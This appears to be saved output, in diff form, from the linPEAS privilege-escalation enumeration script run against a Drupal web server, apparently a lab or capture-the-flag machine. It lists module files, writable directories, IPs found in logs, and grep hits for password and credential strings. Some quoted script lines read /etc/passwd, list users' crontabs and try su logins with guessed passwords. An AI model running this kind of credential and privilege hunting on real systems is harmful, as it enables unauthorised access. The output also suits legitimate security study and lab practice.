+/var/www/html/modules/aggregator/tests/aggregator_test_rss091.xml
+/var/www/html/modules/aggregator/tests/aggregator_test_title_entities.xml
+/var/www/html/modules/block
+/var/www/html/modules/block/block-admin-display-form.tpl.php
+/var/www/html/modules/block/block.admin.inc
+/var/www/html/modules/block/block.api.php
+/var/www/html/modules/block/block.css
+/var/www/html/modules/block/block.info
+/var/www/html/modules/block/block.install
+/var/www/html/modules/block/block.js
+/var/www/html/modules/block/block.module
+/var/www/html/modules/block/block.test
+/var/www/html/modules/block/block.tpl.php
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/block/tests/block_test.info
+/var/www/html/modules/block/tests/block_test.module
+/var/www/html/modules/block/tests/themes
+/var/www/html/modules/block/tests/themes/block_test_theme
+/var/www/html/modules/block/tests/themes/block_test_theme/block_test_theme.info
+/var/www/html/modules/block/tests/themes/block_test_theme/page.tpl.php
+/var/www/html/modules/blog
+/var/www/html/modules/blog/blog.info
+/var/www/html/modules/blog/blog.install
+/var/www/html/modules/blog/blog.module
+/var/www/html/modules/blog/blog.pages.inc
+/var/www/html/modules/blog/blog.test
+/var/www/html/modules/book
+/var/www/html/modules/book/book-all-books-block.tpl.php
+/var/www/html/modules/book/book-export-html.tpl.php
+/var/www/html/modules/book/book-navigation.tpl.php
+/var/www/html/modules/book/book-node-export-html.tpl.php
+/var/www/html/modules/book/book-rtl.css
+/var/www/html/modules/book/book.admin.inc
+/var/www/html/modules/book/book.css
+/var/www/html/modules/book/book.info
+/var/www/html/modules/book/book.install
+/var/www/html/modules/book/book.js
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/color
+/var/www/html/modules/color/color-rtl.css
+/var/www/html/modules/color/color.css
+/var/www/html/modules/color/color.info
+/var/www/html/modules/color/color.install
+/var/www/html/modules/color/color.js
+/var/www/html/modules/color/color.module
+/var/www/html/modules/color/color.test
+/var/www/html/modules/color/images
+/var/www/html/modules/color/preview.html
+/var/www/html/modules/color/preview.js
+/var/www/html/modules/comment
+/var/www/html/modules/comment/comment-node-form.js
+/var/www/html/modules/comment/comment-rtl.css
+/var/www/html/modules/comment/comment-wrapper.tpl.php
+/var/www/html/modules/comment/comment.admin.inc
+/var/www/html/modules/comment/comment.api.php
+/var/www/html/modules/comment/comment.css
+/var/www/html/modules/comment/comment.info
+/var/www/html/modules/comment/comment.install
+/var/www/html/modules/comment/comment.module
+/var/www/html/modules/comment/comment.pages.inc
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/contact
+/var/www/html/modules/contact/contact.admin.inc
+/var/www/html/modules/contact/contact.info
+/var/www/html/modules/contact/contact.install
+/var/www/html/modules/contact/contact.module
+/var/www/html/modules/contact/contact.pages.inc
+/var/www/html/modules/contact/contact.test
+/var/www/html/modules/contextual
+/var/www/html/modules/contextual/contextual-rtl.css
+/var/www/html/modules/contextual/contextual.api.php
+/var/www/html/modules/contextual/contextual.css
+/var/www/html/modules/contextual/contextual.info
+/var/www/html/modules/contextual/contextual.js
+/var/www/html/modules/contextual/contextual.module
+/var/www/html/modules/contextual/contextual.test
+/var/www/html/modules/contextual/images
+/var/www/html/modules/dashboard
+/var/www/html/modules/dashboard/dashboard-rtl.css
+/var/www/html/modules/dashboard/dashboard.api.php
+/var/www/html/modules/dashboard/dashboard.css
+/var/www/html/modules/dashboard/dashboard.info
+/var/www/html/modules/dashboard/dashboard.install
+/var/www/html/modules/dashboard/dashboard.js
+/var/www/html/modules/dashboard/dashboard.module
+/var/www/html/modules/dashboard/dashboard.test
+/var/www/html/modules/dblog
+/var/www/html/modules/dblog/dblog-rtl.css
+/var/www/html/modules/dblog/dblog.admin.inc
+/var/www/html/modules/dblog/dblog.css
+/var/www/html/modules/dblog/dblog.info
+/var/www/html/modules/dblog/dblog.install
+/var/www/html/modules/dblog/dblog.module
+/var/www/html/modules/dblog/dblog.test
+/var/www/html/modules/field
+/var/www/html/modules/field/field.api.php
+/var/www/html/modules/field/field.attach.inc
+/var/www/html/modules/field/field.crud.inc
+/var/www/html/modules/field/field.default.inc
+/var/www/html/modules/field/field.form.inc
+/var/www/html/modules/field/field.info
+/var/www/html/modules/field/field.info.class.inc
+/var/www/html/modules/field/field.info.inc
+/var/www/html/modules/field/field.install
+/var/www/html/modules/field/field.module
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/field/modules/field_sql_storage
+/var/www/html/modules/field/modules/field_sql_storage/field_sql_storage.info
+/var/www/html/modules/field/modules/field_sql_storage/field_sql_storage.install
+/var/www/html/modules/field/modules/field_sql_storage/field_sql_storage.module
+/var/www/html/modules/field/modules/field_sql_storage/field_sql_storage.test
+/var/www/html/modules/field/modules/list
+/var/www/html/modules/field/modules/list/list.info
+/var/www/html/modules/field/modules/list/list.install
+/var/www/html/modules/field/modules/list/list.module
+/var/www/html/modules/field/modules/list/tests
+/var/www/html/modules/field/modules/list/tests/list.test
+/var/www/html/modules/field/modules/list/tests/list_test.info
+/var/www/html/modules/field/modules/list/tests/list_test.module
+/var/www/html/modules/field/modules/number
+/var/www/html/modules/field/modules/number/number.info
+/var/www/html/modules/field/modules/number/number.install
+/var/www/html/modules/field/modules/number/number.module
+/var/www/html/modules/field/modules/number/number.test
+/var/www/html/modules/field/modules/options
+/var/www/html/modules/field/modules/options/options.api.php
+/var/www/html/modules/field/modules/options/options.info
+/var/www/html/modules/field/modules/options/options.module
+/var/www/html/modules/field/modules/options/options.test
+/var/www/html/modules/field/modules/text
+/var/www/html/modules/field/modules/text/text.info
+/var/www/html/modules/field/modules/text/text.install
+/var/www/html/modules/field/modules/text/text.js
+/var/www/html/modules/field/modules/text/text.module
+/var/www/html/modules/field/modules/text/text.test
+/var/www/html/modules/field/tests
+/var/www/html/modules/field/tests/field.test
+/var/www/html/modules/field/tests/field_test.entity.inc
+/var/www/html/modules/field/tests/field_test.field.inc
+/var/www/html/modules/field/tests/field_test.info
+/var/www/html/modules/field/tests/field_test.install
+/var/www/html/modules/field/tests/field_test.module
+/var/www/html/modules/field/tests/field_test.storage.inc
+/var/www/html/modules/field/theme
+/var/www/html/modules/field/theme/field-rtl.css
+/var/www/html/modules/field/theme/field.css
+/var/www/html/modules/field/theme/field.tpl.php
+/var/www/html/modules/field_ui
+/var/www/html/modules/field_ui/field_ui-rtl.css
+/var/www/html/modules/field_ui/field_ui.admin.inc
+/var/www/html/modules/field_ui/field_ui.api.php
+/var/www/html/modules/field_ui/field_ui.css
+/var/www/html/modules/field_ui/field_ui.info
+/var/www/html/modules/field_ui/field_ui.js
+/var/www/html/modules/field_ui/field_ui.module
+/var/www/html/modules/field_ui/field_ui.test
+/var/www/html/modules/file
+/var/www/html/modules/file/file.api.php
+/var/www/html/modules/file/file.css
+/var/www/html/modules/file/file.field.inc
+/var/www/html/modules/file/file.info
+/var/www/html/modules/file/file.install
+/var/www/html/modules/file/file.js
+/var/www/html/modules/file/file.module
+/var/www/html/modules/file/icons
+/var/www/html/modules/file/tests
+/var/www/html/modules/file/tests/file.test
+/var/www/html/modules/file/tests/file_module_test.info
+/var/www/html/modules/file/tests/file_module_test.module
+/var/www/html/modules/filter
+/var/www/html/modules/filter/filter.admin.inc
+/var/www/html/modules/filter/filter.admin.js
+/var/www/html/modules/filter/filter.api.php
+/var/www/html/modules/filter/filter.css
+/var/www/html/modules/filter/filter.info
+/var/www/html/modules/filter/filter.install
+/var/www/html/modules/filter/filter.js
+/var/www/html/modules/filter/filter.module
+/var/www/html/modules/filter/filter.pages.inc
+/var/www/html/modules/filter/filter.test
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/filter/tests/filter.url-input.txt
+/var/www/html/modules/filter/tests/filter.url-output.txt
+/var/www/html/modules/forum
+/var/www/html/modules/forum/forum-icon.tpl.php
+/var/www/html/modules/forum/forum-list.tpl.php
+/var/www/html/modules/forum/forum-rtl.css
+/var/www/html/modules/forum/forum-submitted.tpl.php
+/var/www/html/modules/forum/forum-topic-list.tpl.php
+/var/www/html/modules/forum/forum.admin.inc
+/var/www/html/modules/forum/forum.css
+/var/www/html/modules/forum/forum.info
+/var/www/html/modules/forum/forum.install
+/var/www/html/modules/forum/forum.module
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/help
+/var/www/html/modules/help/help-rtl.css
+/var/www/html/modules/help/help.admin.inc
+/var/www/html/modules/help/help.css
+/var/www/html/modules/help/help.info
+/var/www/html/modules/help/help.module
+/var/www/html/modules/help/help.test
+/var/www/html/modules/image
+/var/www/html/modules/image/image-rtl.css
+/var/www/html/modules/image/image.admin.css
+/var/www/html/modules/image/image.admin.inc
+/var/www/html/modules/image/image.api.php
+/var/www/html/modules/image/image.css
+/var/www/html/modules/image/image.effects.inc
+/var/www/html/modules/image/image.field.inc
+/var/www/html/modules/image/image.info
+/var/www/html/modules/image/image.install
+/var/www/html/modules/image/image.module
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/image/tests/image_module_test.info
+/var/www/html/modules/image/tests/image_module_test.module
+/var/www/html/modules/locale
+/var/www/html/modules/locale/locale-rtl.css
+/var/www/html/modules/locale/locale.admin.inc
+/var/www/html/modules/locale/locale.api.php
+/var/www/html/modules/locale/locale.css
+/var/www/html/modules/locale/locale.datepicker.js
+/var/www/html/modules/locale/locale.info
+/var/www/html/modules/locale/locale.install
+/var/www/html/modules/locale/locale.module
+/var/www/html/modules/locale/locale.test
+/var/www/html/modules/locale/tests
+/var/www/html/modules/locale/tests/locale_test.info
+/var/www/html/modules/locale/tests/locale_test.js
+/var/www/html/modules/locale/tests/locale_test.module
+/var/www/html/modules/locale/tests/translations
+/var/www/html/modules/locale/tests/translations/test.xx.po
+/var/www/html/modules/menu
+/var/www/html/modules/menu/menu.admin.inc
+/var/www/html/modules/menu/menu.admin.js
+/var/www/html/modules/menu/menu.api.php
+/var/www/html/modules/menu/menu.css
+/var/www/html/modules/menu/menu.info
+/var/www/html/modules/menu/menu.install
+/var/www/html/modules/menu/menu.js
+/var/www/html/modules/menu/menu.module
+/var/www/html/modules/menu/menu.test
+/var/www/html/modules/node
+/var/www/html/modules/node/content_types.inc
+/var/www/html/modules/node/content_types.js
+/var/www/html/modules/node/node.admin.inc
+/var/www/html/modules/node/node.api.php
+/var/www/html/modules/node/node.css
+/var/www/html/modules/node/node.info
+/var/www/html/modules/node/node.install
+/var/www/html/modules/node/node.js
+/var/www/html/modules/node/node.module
+/var/www/html/modules/node/node.pages.inc
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/node/tests/node_access_test.info
+/var/www/html/modules/node/tests/node_access_test.install
+/var/www/html/modules/node/tests/node_access_test.module
+/var/www/html/modules/node/tests/node_test.info
+/var/www/html/modules/node/tests/node_test.module
+/var/www/html/modules/node/tests/node_test_exception.info
+/var/www/html/modules/node/tests/node_test_exception.module
+/var/www/html/modules/openid
+/var/www/html/modules/openid/openid-rtl.css
+/var/www/html/modules/openid/openid.api.php
+/var/www/html/modules/openid/openid.css
+/var/www/html/modules/openid/openid.inc
+/var/www/html/modules/openid/openid.info
+/var/www/html/modules/openid/openid.install
+/var/www/html/modules/openid/openid.js
+/var/www/html/modules/openid/openid.module
+/var/www/html/modules/openid/openid.pages.inc
+/var/www/html/modules/openid/openid.test
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/openid/tests/openid_test.info
+/var/www/html/modules/openid/tests/openid_test.install
+/var/www/html/modules/openid/tests/openid_test.module
+/var/www/html/modules/overlay
+/var/www/html/modules/overlay/images
+/var/www/html/modules/overlay/overlay-child-rtl.css
+/var/www/html/modules/overlay/overlay-child.css
+/var/www/html/modules/overlay/overlay-child.js
+/var/www/html/modules/overlay/overlay-parent.css
+/var/www/html/modules/overlay/overlay-parent.js
+/var/www/html/modules/overlay/overlay.api.php
+/var/www/html/modules/overlay/overlay.info
+/var/www/html/modules/overlay/overlay.install
+/var/www/html/modules/overlay/overlay.module
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/path
+/var/www/html/modules/path/path.admin.inc
+/var/www/html/modules/path/path.api.php
+/var/www/html/modules/path/path.info
+/var/www/html/modules/path/path.js
+/var/www/html/modules/path/path.module
+/var/www/html/modules/path/path.test
+/var/www/html/modules/php
+/var/www/html/modules/php/php.info
+/var/www/html/modules/php/php.install
+/var/www/html/modules/php/php.module
+/var/www/html/modules/php/php.test
+/var/www/html/modules/poll
+/var/www/html/modules/poll/poll-bar--block.tpl.php
+/var/www/html/modules/poll/poll-bar.tpl.php
+/var/www/html/modules/poll/poll-results--block.tpl.php
+/var/www/html/modules/poll/poll-results.tpl.php
+/var/www/html/modules/poll/poll-rtl.css
+/var/www/html/modules/poll/poll-vote.tpl.php
+/var/www/html/modules/poll/poll.css
+/var/www/html/modules/poll/poll.info
+/var/www/html/modules/poll/poll.install
+/var/www/html/modules/poll/poll.module
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/profile
+/var/www/html/modules/profile/profile-block.tpl.php
+/var/www/html/modules/profile/profile-listing.tpl.php
+/var/www/html/modules/profile/profile-wrapper.tpl.php
+/var/www/html/modules/profile/profile.admin.inc
+/var/www/html/modules/profile/profile.css
+/var/www/html/modules/profile/profile.info
+/var/www/html/modules/profile/profile.install
+/var/www/html/modules/profile/profile.js
+/var/www/html/modules/profile/profile.module
+/var/www/html/modules/profile/profile.pages.inc
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/rdf
+/var/www/html/modules/rdf/rdf.api.php
+/var/www/html/modules/rdf/rdf.info
+/var/www/html/modules/rdf/rdf.install
+/var/www/html/modules/rdf/rdf.module
+/var/www/html/modules/rdf/rdf.test
+/var/www/html/modules/rdf/tests
+/var/www/html/modules/rdf/tests/rdf_test.info
+/var/www/html/modules/rdf/tests/rdf_test.install
+/var/www/html/modules/rdf/tests/rdf_test.module
+/var/www/html/modules/search
+/var/www/html/modules/search/search-block-form.tpl.php
+/var/www/html/modules/search/search-result.tpl.php
+/var/www/html/modules/search/search-results.tpl.php
+/var/www/html/modules/search/search-rtl.css
+/var/www/html/modules/search/search.admin.inc
+/var/www/html/modules/search/search.api.php
+/var/www/html/modules/search/search.css
+/var/www/html/modules/search/search.extender.inc
+/var/www/html/modules/search/search.info
+/var/www/html/modules/search/search.install
+#)You_can_write_even_more_files_inside_last_directory
+/var/www/html/modules/search/tests/UnicodeTest.txt
+/var/www/html/modules/search/tests/search_embedded_form.info
+/var/www/html/modules/search/tests/search_embedded_form.module
+/var/www/html/modules/search/tests/search_extra_type.info
+/var/www/html/modules/search/tests/search_extra_type.module
+/var/www/html/modules/search/tests/search_node_tags.info
+/var/www/html/modules/search/tests/search_node_tags.module
+/var/www/html/modules/shortcut
+/var/www/html/modules/shortcut/shortcut-rtl.css
+
+[+] Interesting GROUP writable files (not in Home) (max 500)
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files
+  Group www-data:
+/var/www/html/sites/default/files
+/var/www/html/sites/default/files/styles
+/var/www/html/sites/default/files/pictures
+
+[+] Searching passwords in config PHP files
+
+[+] Finding IPs inside logs (limit 70)
+     18 /var/log/wtmp:192.168.56.102
+      8 /var/log/wtmp:10.10.14.6
+      8 /var/log/cloud-init-output.log:192.168.56.103
+      5 /var/log/cloud-init-output.log:10.10.10.2
+      5 /var/log/cloud-init-output.log:10.10.10.102
+      3 /var/log/installer/installer-journal.txt:91.189.94.4
+      3 /var/log/cloud-init-output.log:192.168.56.101
+      1 /var/log/wtmp:192.168.56.1
+      1 /var/log/lastlog:10.10.14.6
+      1 /var/log/installer/subiquity-debug.log:127.255.255.255
+      1 /var/log/cloud-init-output.log:255.255.255.255
+
+[+] Finding passwords inside logs (limit 70)
+/var/log/bootstrap.log: base-passwd depends on libc6 (>= 2.8); however:
+/var/log/bootstrap.log: base-passwd depends on libdebconfclient0 (>= 0.145); however:
+/var/log/bootstrap.log:Preparing to unpack .../base-passwd_3.5.44_amd64.deb ...
+/var/log/bootstrap.log:Preparing to unpack .../passwd_1%3a4.5-1ubuntu1_amd64.deb ...
+/var/log/bootstrap.log:Selecting previously unselected package base-passwd.
+/var/log/bootstrap.log:Selecting previously unselected package passwd.
+/var/log/bootstrap.log:Setting up base-passwd (3.5.44) ...
+/var/log/bootstrap.log:Setting up passwd (1:4.5-1ubuntu1) ...
+/var/log/bootstrap.log:Shadow passwords are now on.
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) ...
+/var/log/bootstrap.log:Unpacking base-passwd (3.5.44) over (3.5.44) ...
+/var/log/bootstrap.log:Unpacking passwd (1:4.5-1ubuntu1) ...
+/var/log/bootstrap.log:dpkg: base-passwd: dependency problems, but configuring anyway as you requested:
+/var/log/cloud-init.log:2018-06-11 11:50:41,333 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 12:14:37,087 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 12:35:55,070 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:21:17,166 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:22:34,978 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:23:23,016 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:24:42,979 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:26:55,930 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:28:14,553 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:31:32,321 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-11 14:34:11,670 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-13 14:34:15,434 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-06-13 19:50:51,831 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-07-01 13:04:22,056 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-07-08 19:18:26,391 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-07-14 21:00:16,592 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2018-07-14 21:09:28,238 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/cloud-init.log:2020-10-23 12:47:23,195 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
+/var/log/dpkg.log:2018-04-26 19:07:29 configure base-passwd:amd64 3.5.44 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:29 install base-passwd:amd64 <none> 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:29 status half-configured base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:29 status half-installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:29 status installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:29 status unpacked base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:31 status half-configured base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:31 status half-installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:31 status unpacked base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:31 upgrade base-passwd:amd64 3.5.44 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:34 install passwd:amd64 <none> 1:4.5-1ubuntu1
+/var/log/dpkg.log:2018-04-26 19:07:34 status half-installed passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2018-04-26 19:07:34 status unpacked passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2018-04-26 19:07:35 configure base-passwd:amd64 3.5.44 <none>
+/var/log/dpkg.log:2018-04-26 19:07:35 status half-configured base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:35 status unpacked base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:36 status installed base-passwd:amd64 3.5.44
+/var/log/dpkg.log:2018-04-26 19:07:37 configure passwd:amd64 1:4.5-1ubuntu1 <none>
+/var/log/dpkg.log:2018-04-26 19:07:37 status half-configured passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2018-04-26 19:07:37 status installed passwd:amd64 1:4.5-1ubuntu1
+/var/log/dpkg.log:2018-04-26 19:07:37 status unpacked passwd:amd64 1:4.5-1ubuntu1
+/var/log/installer/installer-journal.txt:Jun 11 10:35:18 ubuntu-server systemd[1]: Started Forward Password Requests to Wall Directory Watch.
+/var/log/installer/installer-journal.txt:Jun 11 10:35:19 ubuntu-server systemd[1]: Started Dispatch Password Requests to Console Directory Watch.
+
+[+] Finding emails inside logs (limit 70)
+      2 /var/log/bootstrap.log:ftpmaster@ubuntu.com
+      1 /var/log/installer/installer-journal.txt:dm-devel@redhat.com
+
+[+] Finding *password* or *credential* files in home (limit 70)
+
+[+] Finding 'pwd' or 'passw' variables (and interesting php db definitions) inside key folders (limit 70)
+/etc/bash_completion.d/grub:__grub_mkpasswd_pbkdf2_program="grub-mkpasswd-pbkdf2"
+/etc/cloud/cloud.cfg:     lock_passwd: True
+/etc/cloud/cloud.cfg:     sudo: ["ALL=(ALL) NOPASSWD:ALL"]
+/etc/nsswitch.conf:passwd:         compat systemd
+/etc/pam.d/common-password:password	[success=1 default=ignore]	pam_unix.so obscure sha512
+/etc/security/namespace.init:                gid=$(echo "$passwd" | cut -f4 -d":")
+/etc/security/namespace.init:        homedir=$(echo "$passwd" | cut -f6 -d":")
+/etc/security/namespace.init:        passwd=$(getent passwd "$user")
+/etc/ssl/openssl.cnf:challengePassword		= A challenge password
+/etc/ssl/openssl.cnf:challengePassword_max		= 20
+/etc/ssl/openssl.cnf:challengePassword_min		= 4
+/etc/vmware-tools/vm-support:         sed 's/password[[:space:]]\+\(.*\)[[:space:]]\+\(.*\)$/password \1 xxxxxx/g' > \
+/etc/vsftpd.conf:no_anon_password=YES
+/tmp/linpeas.sh:      SHELLUSERS=`cat /etc/passwd 2>/dev/null | grep -i "sh$" | cut -d ":" -f 1`
+/tmp/linpeas.sh:    P)  PASSWORD=$OPTARG;;
+/tmp/linpeas.sh:    echo "  You can login as $USER using password: $PASSWORDTRY" | sed -E "s,.*,${C}[1;31;103m&${C}[0m,"
+/tmp/linpeas.sh:    printf $Y"[+] "$GREEN"Testing 'su' as other users with shell using as passwords: null pwd, the username and top2000pwds\n"$NC
+/tmp/linpeas.sh:  FIND_PASSWORD_RELEVANT_NAMES=$(prep_to_find "$PASSWORD_RELEVANT_NAMES")
+/tmp/linpeas.sh:  PASSWORDTRY=$2
+/tmp/linpeas.sh:  PASSWORD_RELEVANT_NAMES="*password* *credential* creds*"
+/tmp/linpeas.sh:PASSWORD=""
+/tmp/linpeas.sh:processesDump="gdm-password|gnome-keyring-daemon|lightdm|vsftpd|apache2|sshd:"
+/tmp/lse.sh:    'for u in $(cut -d: -f 1 /etc/passwd); do [ "$u" != "$lse_user" ] && crontab -l -u "$u"; done'
+/tmp/lse.sh:    'for u in $(cut -d: -f1 /etc/passwd); do [ $(id -u $u) = 0 ] && echo $u; done | grep -v root'
+/tmp/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+/tmp/lse.sh:  cecho "${lblue}    Password:${reset} "
+/tmp/lse.sh:[ -z "$lse_home" ] && lse_home="`(grep -E "^$lse_user:" /etc/passwd | cut -d: -f6)2>/dev/null`"
+/var/backups/dpkg.status.0:Depends: passwd, debconf (>= 0.5) | debconf-2.0
+/var/www/html/includes/bootstrap.inc:define('DRUPAL_BOOTSTRAP_DATABASE', 2);
+/var/www/html/includes/common.inc:      $proxy_password = variable_get('proxy_password', '');
+/var/www/html/includes/common.inc:    'password' => array(
+/var/www/html/includes/common.inc:define('DRUPAL_CACHE_PER_USER', 0x0002);
+/var/www/html/includes/database/database.inc:  function __construct($dsn, $username, $password, $driver_options = array()) {
+/var/www/html/includes/database/pgsql/database.inc:      $connection_options['password'] = NULL;
+/var/www/html/includes/database/pgsql/database.inc:      $connection_options['password'] = str_replace('\\', '\\\\', $connection_options['password']);
+/var/www/html/includes/filetransfer/filetransfer.inc:    $form['password'] = array(
+/var/www/html/includes/filetransfer/ftp.inc:    $password = empty($settings['password']) ? '' : $settings['password'];
+/var/www/html/includes/filetransfer/ftp.inc:    $pwd = ftp_pwd($this->connection);
+/var/www/html/includes/filetransfer/ftp.inc:    $this->password = $password;
+/var/www/html/includes/filetransfer/ssh.inc:    $password = empty($settings['password']) ? '' : $settings['password'];
+/var/www/html/includes/filetransfer/ssh.inc:    $this->password = $password;
+/var/www/html/includes/filetransfer/ssh.inc:  function __construct($jail, $username, $password, $hostname = "localhost", $port = 22) {
+/var/www/html/includes/form.inc:function form_type_password_confirm_value($element, $input = FALSE) {
+/var/www/html/includes/install.inc:    $form['password'] = array(
+/var/www/html/includes/locale.inc:define('LOCALE_LANGUAGE_NEGOTIATION_USER', 'locale-user');
+/var/www/html/includes/password.inc:    $password = md5($password);
+/var/www/html/includes/password.inc:  return (_password_get_count_log2($account->pass) !== $count_log2);
+/var/www/html/includes/password.inc:function user_hash_password($password, $count_log2 = 0) {
+/var/www/html/includes/update.inc:      'password' => isset($url['pass']) ? urldecode($url['pass']) : '',
+/var/www/html/modules/simpletest/drupal_web_test_case.php:        $curl_options[CURLOPT_USERPWD] = $this->httpauth_credentials;
+/var/www/html/modules/simpletest/drupal_web_test_case.php:    $password = variable_get('simpletest_httpauth_password', NULL);
+/var/www/html/modules/simpletest/simpletest.pages.inc:  $form['httpauth']['simpletest_httpauth_password'] = array(
+/var/www/html/modules/simpletest/simpletest.pages.inc:  $password = variable_get('simpletest_httpauth_password');
+/var/www/html/modules/simpletest/tests/common.test:    $password = $this->randomName();
+/var/www/html/modules/simpletest/tests/filetransfer.test:  function __construct($jail, $username, $password, $hostname = 'localhost', $port = 9999) {
+/var/www/html/modules/simpletest/tests/filetransfer.test:  protected $password = 'password';
+/var/www/html/modules/simpletest/tests/filetransfer.test:  protected $password = NULL;
+/var/www/html/modules/simpletest/tests/form.test:    $elements['password']['empty_values'] = $empty_strings;
+/var/www/html/modules/simpletest/tests/form.test:    $this->checkFormValue('password_confirm', $multivalue, array('pass1' => '', 'pass2' => ''));
+/var/www/html/modules/simpletest/tests/form_test.module:  $form['password'] = array(
+/var/www/html/modules/simpletest/tests/form_test.module:  $form['password_confirm'] = array(
+/var/www/html/modules/simpletest/tests/password.test:    $password .= 'xx';
+/var/www/html/modules/simpletest/tests/password.test:    $password = 'baz';
+/var/www/html/modules/simpletest/tests/password.test:    $password = str_repeat('x', 512);
+/var/www/html/modules/simpletest/tests/password.test:    $password = str_repeat('x', 513);
+/var/www/html/modules/simpletest/tests/password.test:    $password = str_repeat('€', 170);
+/var/www/html/modules/simpletest/tests/password.test:    $password = str_repeat('€', 171);
+/var/www/html/modules/simpletest/tests/system_test.module:  $output .= t('Password is @password.', array('@password' => $pw));
+/var/www/html/modules/system/system.module:  $types['password'] = array(
+/var/www/html/modules/system/system.module:  $types['password_confirm'] = array(
+
+[+] Finding possible password variables inside key folders (limit 70)
+/var/www/html/includes/install.inc:    $mysql_database = $databases['mysql'];
+
+[+] Finding possible password in config files
+ /etc/apache2/apache2.conf
+passwd files from being
+ /etc/nsswitch.conf
+passwd:         compat systemd
+ /etc/sysctl.d/10-ptrace.conf
+credentials that exist in memory (re-using existing SSH connections,
+ /etc/adduser.conf
+passwd
+ /etc/overlayroot.conf
+password is randomly generated
+password will be stored for recovery in
+passwd
+password,mkfs=0
+PASSWORD="foobar"
+PASSWORD" |
+PASSWORD" |
+PASSWORD HERE IN THIS CLEARTEXT CONFIGURATION
+passwords are more secure, but you won't be able to
+passwords are generated by calculating the sha512sum
+ /etc/debconf.conf
+passwords.
+password
+passwords.
+passwords
+password
+passwords.dat
+passwords and one for everything else.
+passwords
+password is really
+Passwd: secret
+
+[+] Finding 'username' string inside key folders (limit 70)
+/tmp/lse.sh:    'grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab'
+/var/www/html/includes/common.inc:    'username' => array(
+/var/www/html/includes/common.inc:    if ($proxy_username = variable_get('proxy_username', '')) {
+/var/www/html/includes/database/database.inc:  function __construct($dsn, $username, $password, $driver_options = array()) {
+/var/www/html/includes/filetransfer/filetransfer.inc:    $form['username'] = array(
+/var/www/html/includes/filetransfer/ftp.inc:    $this->username = $username;
+/var/www/html/includes/filetransfer/ftp.inc:    $username = empty($settings['username']) ? '' : $settings['username'];
+/var/www/html/includes/filetransfer/ssh.inc:    $this->username = $username;
+/var/www/html/includes/filetransfer/ssh.inc:    $username = empty($settings['username']) ? '' : $settings['username'];
+/var/www/html/includes/filetransfer/ssh.inc:  function __construct($jail, $username, $password, $hostname = "localhost", $port = 22) {
+/var/www/html/includes/install.inc:    $form['username'] = array(
+/var/www/html/includes/update.inc:      'username' => urldecode($url['user']),
+/var/www/html/modules/blog/blog.module:        'title' => t("!username's blog", array('!username' => format_username($node))),
